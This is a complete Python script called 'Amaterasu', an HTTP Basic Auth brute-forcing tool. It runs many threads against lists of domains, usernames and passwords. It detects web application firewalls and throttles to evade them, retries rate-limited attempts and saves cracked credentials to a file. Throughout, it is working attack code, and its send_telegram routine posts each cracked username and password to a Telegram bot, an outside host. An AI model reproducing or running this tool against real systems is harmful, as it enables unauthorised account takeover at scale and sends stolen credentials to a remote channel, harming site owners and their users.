#!/usr/bin/env python3
import argparse
import base64
import requests
import sys
import subprocess
from pathlib import Path
import concurrent.futures
import threading
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------
# Config
# ---------------------------
TELEGRAM_TOKEN = "TELEGRAM_TOKEN"
TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID"
TELEGRAM_TOPIC_SUCCESS = None
TELEGRAM_TOPIC_ERROR = None
ERROR_CREDS = []
ERROR_LOCK = threading.Lock()

# ---------------------------
# ANSI color codes
# ---------------------------
RESET = "\033[0m"
BOLD = "\033[1m"
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RED = "\033[91m"
ORANGE = "\033[38;5;208m"  # for fire effect

# ---------------------------
# Session Management
# ---------------------------
def create_session():
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"})
    return session

def get_session():
    return create_session()

# ---------------------------
# Helpers
# ---------------------------
def send_telegram(text: str, topic_id: int = None):
    try:
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
        if topic_id:
            data["message_thread_id"] = topic_id
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data=data, timeout=3)
    except:
        pass

def detect_waf(url: str, session: requests.Session) -> str:
    try:
        r = session.get(url, timeout=6, verify=False)
        headers = " ".join(f"{k}:{v}".lower() for k, v in r.headers.items())
        if any(x in headers for x in ["cf-ray", "cloudflare", "akamai", "fastly", "x-sucuri"]):
            return "WAF Detected (Heuristic)"
    except:
        pass
    try:
        proc = subprocess.run(["wafw00f", url], capture_output=True, text=True, timeout=6)
        if "behind" in proc.stdout.lower():
            return proc.stdout.split("behind", 1)[1].split("WAF", 1)[0].strip()
    except:
        pass
    return "No WAF"

def build_auth(user: str, pwd: str):
    return {"Authorization": "Basic " + base64.b64encode(f"{user}:{pwd}".encode()).decode()}

def save_success(domain: str, user: str, pwd: str, status: int):
    with open("SUCCESS.txt", "a") as f:
        f.write(f"{domain} | {user}:{pwd} | Status: {status}\n")

def save_error(user: str, pwd: str, error: str):
    with ERROR_LOCK:
        ERROR_CREDS.append((user, pwd, error))
    with open("ERRORS.txt", "a") as f:
        f.write(f"{user}:{pwd} | {error}\n")

def read_list(path):
    p = Path(path)
    if not p.exists():
        print(f"[!] Missing: {path}")
        return []
    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]

def read_errors():
    if not Path("ERRORS.txt").exists():
        return []
    creds = []
    with open("ERRORS.txt", "r") as f:
        for line in f:
            if ":" in line and "|" in line:
                cred = line.split("|")[0].strip()
                if ":" in cred:
                    u, p = cred.split(":", 1)
                    creds.append((u, p))
    return creds

# ---------------------------
# Display formatter
# ---------------------------
def status_emoji(code):
    if code == 200:
        return "✅"
    elif code == 401:
        return "🔒"
    elif code == 403:
        return "🚫"
    elif code == 429:
        return "⚠️"
    elif code == 503:
        return "🛑"
    else:
        return "❓"

def format_display(state, domain, total):
    with state['lock']:
        count = state['count']
        status_counts = state['status_counts'].copy()
        user = state['current_user']
        pwd = state['current_password']

        # Build status summary
        status_parts = []
        for code in sorted(status_counts.keys(), key=lambda x: str(x)):
            emoji = status_emoji(code)
            status_parts.append(f"{emoji} {code}: {status_counts[code]}")
        status_str = ", ".join(status_parts) if status_parts else "⏳ 0"

        # Clear line, carriage return
        return (
            f"\033[2K\r"
            f"{BOLD}{ORANGE}[{domain}]{RESET} "
            f"{GREEN}Status:{RESET} {status_str} | "
            f"{YELLOW}👤 Username:{RESET} {user:<15} | "
            f"{YELLOW}🔑 Password:{RESET} {pwd:<15} | "
            f"{MAGENTA}🔥 Progress:{RESET} {count}/{total}"
        )

# ---------------------------
# Brute task
# ---------------------------
def try_cred(domain: str, user: str, pwd: str, args, session: requests.Session, state: dict, total: int):
    try:
        with state['lock']:
            state['current_user'] = user
            state['current_password'] = pwd

        headers = build_auth(user, pwd)
        r = session.get(domain, headers=headers, timeout=args.timeout, verify=not args.insecure, allow_redirects=True)
        status = r.status_code

        with state['lock']:
            state['count'] += 1
            state['status_counts'][status] = state['status_counts'].get(status, 0) + 1

        # Save 403, 429, 503 for later retry
        if status in [403, 429, 503]:
            save_error(user, pwd, f"HTTP {status}")

        # Success only if status is not 401, 403, 429, or 503
        if status not in (401, 403, 429, 503):
            with state['lock']:
                state['success_found'] = True
                state['success_details'] = (domain, user, pwd, status)
            return True
        return False

    except Exception as e:
        err_msg = str(e)[:50]
        save_error(user, pwd, err_msg)
        with state['lock']:
            state['count'] += 1
            state['status_counts']['ERR'] = state['status_counts'].get('ERR', 0) + 1
        return False

# ---------------------------
# Brute Engine per Domain
# ---------------------------
def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, silent=False, threads=None):
    global ERROR_CREDS
    ERROR_CREDS = []
    session = get_session()
    domain = domain.strip().rstrip("/")
    if not domain.startswith("http"):
        domain = "https://" + domain

    # Use provided threads or default to args.threads
    if threads is None:
        threads = args.threads

    waf_detected = False

    # Initial 401 check - only for normal mode, not retry
    if not retry_mode:
        # Try connecting to the domain, fallback to http if https fails
        original_domain = domain
        candidate_urls = [domain]
        if domain.startswith("https://"):
            candidate_urls.append(domain.replace("https://", "http://", 1))
        elif not domain.startswith("http://"):  # shouldn't happen after prepending https, but just in case
            candidate_urls.append("http://" + domain)

        connected_url = None
        for url in candidate_urls:
            try:
                r = session.get(url, timeout=args.timeout, verify=not args.insecure)
                connected_url = url
                break
            except Exception as e:
                continue

        if connected_url is None:
            if not silent:
                print(f"[{original_domain}] [!] Cannot reach (both https and http failed)")
            session.close()
            return False, waf_detected

        # Use the working URL for the rest of the process
        domain = connected_url

        if r.status_code != 401:
            if not silent:
                print(f"[{domain}] [{r.status_code}] Not Basic Auth protected → Skipping")
            session.close()
            return False, waf_detected

        # WAF detection
        waf = detect_waf(domain, session)
        if not silent:
            print(f"[WAF] {waf}")
        waf_detected = (waf != "No WAF")

        # Skip if WAF detected and --skip-waf is set
        if getattr(args, "skip_waf", False) and waf_detected:
            if not silent:
                print(f"[!] Skipping {domain} because WAF detected (--skip-waf)")
            session.close()
            return False, waf_detected

        # If --waf is set and WAF detected, lower thread count
        if waf_detected and getattr(args, "waf", None) is not None:
            threads = args.waf
            if not silent:
                print(f"[!] WAF detected, using {threads} threads (--waf)")

    source = read_errors() if retry_mode else [(u, p) for u in users for p in passes]
    total = len(source)
    if total == 0:
        return False, waf_detected

    if not silent:
        print(f"[+] {'Retry' if retry_mode else 'Brute'} {domain}: {total} attempts → {threads} threads")
    else:
        print(f"[+] Starting {domain}: {total} attempts")

    state = {
        'lock': threading.Lock(),
        'count': 0,
        'status_counts': {},
        'current_user': '',
        'current_password': '',
        'success_found': False,
        'success_details': None,
        'print_lock': threading.Lock()
    }

    success_found = False

    def cred_generator():
        for u, p in source:
            yield u, p
            time.sleep(0.001)

    gen = cred_generator()
    continue_flag = getattr(args, "continue", False)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futures = set()
        initial_fill = min(threads * 2, total, 1000)
        for _ in range(initial_fill):
            try:
                u, p = next(gen)
                futures.add(pool.submit(try_cred, domain, u, p, args, session, state, total))
            except StopIteration:
                break

        while futures:
            done, futures = concurrent.futures.wait(
                futures,
                timeout=1,
                return_when=concurrent.futures.FIRST_COMPLETED
            )

            print(format_display(state, domain, total), end="", flush=True)

            for future in done:
                if future.result():
                    success_found = True
                    # Always send success message, even in continue mode
                    with state['lock']:
                        details = state['success_details']
                    if details:
                        d, u, p, s = details
                        msg = f"🔥🎉 SUCCESS FOUND 🎉🔥\n\n🌐 Domain: {d}\n👤 Username: {u}\n🔑 Password: {p}\n📊 Status: {s}"
                        if not continue_flag:
                            print()  # newline before success message
                            print(msg)
                        save_success(d, u, p, s)
                        send_telegram(msg, TELEGRAM_TOPIC_SUCCESS)
                    
                    if not continue_flag:
                        # Cancel all running tasks
                        for f in futures:
                            f.cancel()
                        # Drain generator to prevent refill
                        try:
                            while True: next(gen)
                        except StopIteration:
                            pass
                        futures.clear()
                        break

            # Break out of main loop if success and not continuing
            if not continue_flag and success_found:
                break

            # Refill
            for _ in range(len(done)):
                try:
                    u, p = next(gen)
                    futures.add(pool.submit(try_cred, domain, u, p, args, session, state, total))
                except StopIteration:
                    break

    print()  # new line after dynamic display ends
    session.close()
    return success_found, waf_detected

# ---------------------------
# Main
# ---------------------------
def print_separator():
    print("\n" + "-" * 100 + "\n")

def banner():
    print(r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⣀⠀⠀⠀⠀⠀⠀⢲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡆⠀⠀⠀⠀⠀⠀⠀⠛⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⣤⠀⠀⠀⠀⠀⢻⣿⣷⣄⢀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣄⠀⠀⠀⠀⣿⣿⣿⣷⠱⣆⠀⠀⠀⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣽⣿⡆⠀⠀⠀⢸⣿⣞⣿⣧⢸⣷⣤⠀⢸⣿⣯⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⢰⣿⡷⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⡄⠀⠀⠀⠀⢻⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣟⣾⣿⠀⠀⠀⣼⣿⡏⣿⣿⠀⣿⣿⣗⠺⣿⣳⣿⣧⠀⠀⠀⠀⠀⠀⠀⣴⣿⡟⠀⣸⣿⡟⣽⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣆⠀⠀⠀⠀⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣯⢿⣿⡇⠀⣰⣿⡿⢸⣿⡿⠀⣼⣿⣻⡦⣿⣯⢿⣿⡆⠀⠀⠀⠀⢀⣾⣿⣿⠀⢠⣿⡿⢱⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⢯⣿⠀⠀⢠⠀⣼⣿⣻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⣰⣿⣿⣞⣿⣿⠃⢀⣿⡿⣡⣿⡿⠃⢀⣿⣿⣽⣷⢹⣿⣻⢿⣿⡄⠀⠀⢀⣾⣿⢿⡇⠀⣾⣿⣱⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠁⢀⡿⢰⣿⣣⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡄⠀⠀⠀⢰⣿⣿⣻⣼⣿⡿⠀⢸⣿⢣⣿⡿⠁⣠⣿⣿⡟⣾⣿⢈⣿⣯⣟⣿⣷⠀⠀⣸⣿⣟⣿⡇⠀⣿⣧⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣳⣿⡟⠀⣾⡇⢸⣷⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡄⠀⢠⣿⣿⢯⣳⣿⣿⣦⣄⠘⣿⣿⡿⠁⣴⣿⣿⢯⣽⣿⡟⢀⣿⣷⢯⣿⣿⡇⠀⣿⣿⣽⣻⣿⠀⣿⣷⣿⠇⠀⠀⠀⠀⣀⠀⠀⢀⣼⣿⣿⣳⢿⣿⠁⣰⣿⣇⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⢿⣷⠀⣿⣿⢯⣟⣼⣿⡇⢻⣿⣧⠘⣿⠃⣼⣿⡿⡽⣞⣿⣿⠁⢸⣿⣟⣮⢿⣿⡇⠀⣿⣿⢶⣻⣿⣇⠘⣿⣿⠀⠀⢀⣴⡿⠁⠀⣠⣿⢱⣿⣯⣽⣻⣿⠀⣿⡿⣿⡄⢻⣧⠀⠀⠀⠀⠀⠀⣴⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⢿⡇⢰⣿⣯⡟⣼⣿⣿⠁⠘⣿⣽⣧⠈⢰⣿⣯⡷⣛⣿⣿⠃⠀⣼⣿⣿⢼⣻⣿⡇⠀⢺⣿⡿⣼⣻⣿⣦⠘⠇⠀⣠⣿⡿⠁⠀⣰⣿⡟⢸⣿⣳⢾⡽⣿⣇⢸⣿⡿⣿⣆⠙⠀⠀⠀⠀⢀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⣿⠃⣿⣟⣾⢡⡿⣿⡟⠀⠀⢿⣯⢿⡇⣼⣿⣞⡇⣿⣿⣯⠀⣼⣿⣿⠏⣾⣿⣟⣰⡇⠘⣿⣿⣳⣭⢿⣿⣧⠀⢠⣿⣿⡃⠀⢰⣿⡿⡇⠸⣿⣯⡇⢻⣿⣿⣯⣿⣿⣿⣿⣷⡀⠀⠀⢀⣿⣿⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠐⣿⣯⣿⣇⠱⣆⡀⠀⠀⠀⣸⣿⡿⣽⡿⢸⣿⢯⡇⢸⣟⣯⣟⠀⠀⣻⣿⣻⣿⢼⣷⣻⠄⢸⣿⣿⣿⣿⡿⠏⣸⣿⣿⣷⣿⡅⠀⢸⣿⣷⣏⣾⣻⣿⡆⢸⣿⢿⡅⠀⣾⣿⣻⣿⠐⣿⣿⣻⡄⠻⣽⣿⣯⣿⣷⣻⢿⣿⡆⠀⢸⣿⣟⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⣧⡀⠀⢻⣿⣾⣿⣆⠹⣿⣆⠀⢠⣿⣿⡽⣿⡇⢸⣿⢯⡇⢸⣯⢿⣿⡀⣠⣿⣟⡷⣿⢸⣿⡽⣇⠀⡹⠾⠟⠋⢀⣾⣿⣿⣻⣿⢿⡆⠀⢈⣿⣿⢾⡘⣷⣻⣷⣸⣿⢿⣧⠀⣿⣿⣽⣿⡆⠘⣿⣿⣽⡀⢹⡾⣿⣯⢻⣿⣯⢿⣿⡄⢸⣿⣯⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣷⡀⠸⣿⣷⣻⣿⡀⣿⣿⡧⢼⣿⢷⣻⣿⡇⢹⣿⣟⡆⠈⣿⣻⢿⣷⣿⡿⣭⣿⡟⠘⣿⣟⣯⠀⠐⡀⢂⢠⣿⣿⣿⠍⣿⣿⢿⣿⣦⣼⣿⣟⣾⠇⢹⣯⢿⡏⣿⡿⣿⡀⢺⣿⣞⣿⣿⣦⣹⣿⣯⠇⠀⣿⣻⣿⠀⣿⣯⣟⣿⣷⠈⣿⣿⢯⡿⣿⣧⡀⠀⠀⠀⢀⣀⣤
⠀⠀⠀⣿⣿⣇⠀⣿⣷⣻⣿⡇⢹⣯⣿⣼⣿⡇⣿⣿⡇⠘⣿⣯⡗⠀⢜⢯⡿⡽⣯⢷⣯⣿⡷⢨⣿⣟⣾⠀⡼⠁⡌⣾⣿⣿⡏⠀⣿⣿⢯⡿⣿⣟⣿⡽⣾⠀⠐⣯⣿⣟⢿⣿⢿⣷⡜⣿⣯⠺⣟⡿⣿⣟⡿⡀⠀⡿⣽⣿⠀⣿⣿⢞⣿⡟⣲⡿⢻⣿⣳⢟⣿⣿⡄⠀⣴⣿⣿⠃
⠀⠀⣼⣿⣯⡇⣼⣿⢷⣻⣿⠀⣽⡿⣽⣿⣿⣽⢸⣿⣿⣤⣿⣯⡟⢧⠈⢢⡙⡿⠁⣾⢿⣿⡇⢸⣿⣟⣾⠰⡇⣸⠱⣟⣿⣷⡀⠀⣿⣿⣳⢻⡽⣿⡳⣽⢣⠇⢈⡷⣿⣏⠸⣿⣯⢿⣿⡹⣿⣷⡈⠙⠳⠟⠐⠀⠀⣿⣿⣇⣼⣿⣯⢿⣿⣷⣿⡇⠘⣿⣯⡛⣾⣿⣟⢰⣿⢿⡟⠀
⠀⣼⣿⣿⣿⣽⣿⡿⣫⣿⡇⢰⣿⣟⣿⡏⣿⣿⣆⠹⢿⡿⣟⣷⡻⢸⡄⠀⢻⠃⠀⣿⣿⣿⣀⣾⣿⣽⡎⢸⠁⡏⠀⣿⣻⣿⣿⣾⣿⡿⣽⠃⢻⡷⣽⢋⡎⠀⣴⡿⣿⡿⢀⣿⣟⢺⣿⣧⠹⣿⣿⣄⠀⠙⡆⠀⠀⣿⣿⣿⣿⡟⣾⣿⣿⣿⡽⣇⠀⣹⣿⣽⠸⣿⣿⢨⣿⣿⣷⠀
⣼⣿⣟⣿⣿⣿⣿⢃⣿⣿⣷⣿⣿⢞⣿⡇⢸⣿⣽⡄⠠⡙⢿⣯⡗⢨⠀⠀⡘⠰⡰⠘⣿⢿⣿⢿⣻⡞⠁⡾⠀⢱⡐⠈⠷⣯⣟⣯⣟⡽⢏⠀⢨⡿⢁⡞⠀⢰⣿⣿⣿⠃⢈⣿⣿⡃⣿⣿⠄⢻⣿⣽⠀⠀⢧⡀⡆⢹⣾⡽⠃⣾⣿⡿⢸⣿⣽⣿⣦⣿⣿⡏⢘⣷⣿⢸⣿⢿⣿⡄
⣿⣿⢽⣿⣿⣿⢾⠀⢿⣻⢿⣯⠏⣾⣿⡇⠘⣿⣯⢿⠀⠙⣆⠹⠇⣤⠇⡄⡃⠀⡇⠀⢈⠙⠙⢋⡁⠀⠠⢹⠀⣄⠑⡌⠀⡀⠉⡈⢀⣰⡾⠀⣼⣣⠋⠇⡀⢺⣯⣿⡟⠀⢀⣿⣟⡇⣿⣿⡇⢸⣿⣾⠁⡆⢸⡇⢸⠈⡻⠀⢸⣟⣿⡇⠸⣿⣷⠻⣿⣿⠟⠀⣸⣿⣿⣾⣿⢯⣿⡧
⣿⣿⢸⣿⣿⣿⣻⡇⠈⠻⣿⠁⠨⡷⣿⣷⣤⣽⣿⣻⠅⠀⠘⡆⣸⠏⡰⠀⡇⡄⠘⡄⠂⠈⢀⠀⠲⣀⠀⣽⠀⡈⡦⡈⠢⢑⠀⣴⠞⢁⡠⢀⡽⠁⢸⠀⠀⢹⣿⣿⡇⢀⣾⣿⣿⠁⢿⣽⣿⣿⣿⠟⢠⠃⡘⢧⠈⢫⠀⠀⠸⣯⣿⣷⣤⣿⣿⡇⠘⣋⠆⢠⣿⣿⣿⣿⠏⣾⣿⡇
⠹⣿⣧⠻⣿⢿⣷⣻⣄⠘⣄⠀⢀⠿⣽⣻⢿⡿⣯⠟⠀⠀⠀⡼⠃⣴⠇⣸⠁⢸⢂⠘⢔⠀⡀⠀⡄⠻⣄⠘⣇⢡⠀⡉⠢⡀⠉⠁⡔⠋⠁⠨⠁⢀⢾⡀⠆⠘⣷⢿⣿⣿⣿⡿⠃⠀⢊⢉⡛⠋⠁⡠⠃⢠⠃⡘⠠⡀⢷⡀⡀⠻⢽⣿⣿⣿⠟⠀⠐⠁⣠⠿⠿⠛⠋⢁⣰⣿⣿⠁
⠀⠹⣿⣷⣌⡙⠛⠽⠷⢧⡈⠢⣄⠲⢍⡛⠳⠛⠁⢊⣠⠞⠋⣰⡟⢁⣴⠇⢀⠂⣦⣉⠢⢄⡑⠄⠈⣶⢄⣁⠙⠤⡂⠹⢦⣈⠓⠈⢠⡶⣼⡄⡶⣹⣧⣳⡘⠰⢌⡛⠚⢓⢫⠴⠁⠀⠈⠁⠀⢐⡭⠔⢒⡇⢠⣇⢠⣆⠈⣷⣈⠢⢄⡠⢉⠀⠀⣀⠄⠘⠁⠀⠀⣠⣴⡿⣿⡿⠋⠀
⠀⠀⠈⠙⠿⢽⣷⣶⣤⣤⣌⣦⣈⣳⣶⣤⣤⣴⣠⣭⣴⣶⣛⣧⣴⣾⣩⣴⣾⣧⣝⣯⣷⣶⣭⣗⣤⣈⣛⣶⣭⣝⣃⣂⣀⣉⣻⣦⣔⣿⣮⣅⣁⣻⣾⣽⣻⣧⣤⣥⣤⣠⣄⣤⣠⣤⣤⣴⣶⣯⣤⣶⣯⣴⣟⣿⣮⣟⣷⣮⣟⣿⣶⣶⣖⣶⣾⣥⣖⣶⣲⣮⣷⠿⠞⠋⠁⠀⠀⠀

                                        🔥 Amaterasu 🔥
----------------------------------------------------------------------------------------------------
    """)

def main():
    parser = argparse.ArgumentParser(description="HTTP Basic Auth Brute Forcer - Multi-Domain, Stop/Continue on Success")
    parser.add_argument("-d", "--domain", help="Single target domain (e.g. https://example.com)")
    parser.add_argument("-l", "--domains", help="File containing list of domains (one per line)")
    parser.add_argument("-u", "--users", default="Username_List.txt", help="User list file (default: Username_List.txt)")
    parser.add_argument("-p", "--passes", default="Password_List.txt", help="Password list file (default: Password_List.txt)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Threads per domain (default: 50)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Request timeout (default: 5s)")
    parser.add_argument("--no-insecure", action="store_false", dest="insecure", default=True,
                        help="Enable SSL verification (disable insecure mode)")
    parser.add_argument("--use-wafw00f", action="store_true", help="Use wafw00f for WAF detection (currently always used)")
    parser.add_argument("--silent", action="store_true", help="Show only progress and results")
    parser.add_argument("--no-retry", action="store_false", dest="retry", default=True,
                        help="Disable auto-retry of failed credentials (429/503/errors)")
    parser.add_argument("-c", "--continue", action="store_true", help="Continue brute-forcing even after success")
    parser.add_argument("--skip-waf", action="store_true", help="Skip domains where WAF is detected")
    parser.add_argument("--waf", nargs="?", const=10, type=int, default=None,
                        help="If set, use lower thread count for domains with WAF (default: 10 if no value)")
    args = parser.parse_args()

    if not args.silent:
        banner()

    # Clear ERRORS.txt at start to avoid stale entries from previous runs
    if Path("ERRORS.txt").exists():
        Path("ERRORS.txt").unlink()

    # Load domains
    if args.domains:
        domains = read_list(args.domains)
        if not domains:
            sys.exit(1)
    elif args.domain:
        domains = [args.domain]
    else:
        print("[!] Provide --domain or --domains")
        sys.exit(1)

    # Load credentials for main brute (always use user/pass lists, not errors)
    users = read_list(args.users)
    passes = read_list(args.passes)
    if not users or not passes:
        print("[!] Missing username or password lists.")
        sys.exit(1)

    overall_success = False
    for idx, domain in enumerate(domains):
        if idx > 0:
            print_separator()

        success, waf_detected = run_brute_on_domain(domain, users, passes, args, retry_mode=False, silent=args.silent)
        if success:
            overall_success = True

        # Auto-retry failed creds
        if args.retry and not success and Path("ERRORS.txt").exists():
            error_count = len(read_errors())
            if error_count > 0:
                if not args.silent:
                    print(f"\n🔥 Auto-retrying {error_count} failed attempts on {domain}...")
                time.sleep(1)
                retry_threads = 10
                if waf_detected and args.waf is not None:
                    retry_threads = args.waf
                retry_success, _ = run_brute_on_domain(domain, [], [], args, retry_mode=True, silent=args.silent, threads=retry_threads)
                if retry_success:
                    overall_success = True

        if Path("ERRORS.txt").exists():
            Path("ERRORS.txt").unlink()

    print("🔥✅ All done." if overall_success else "🔥❌ No success.")
    sys.exit(0 if overall_success else 1)

if __name__ == "__main__":
    main()
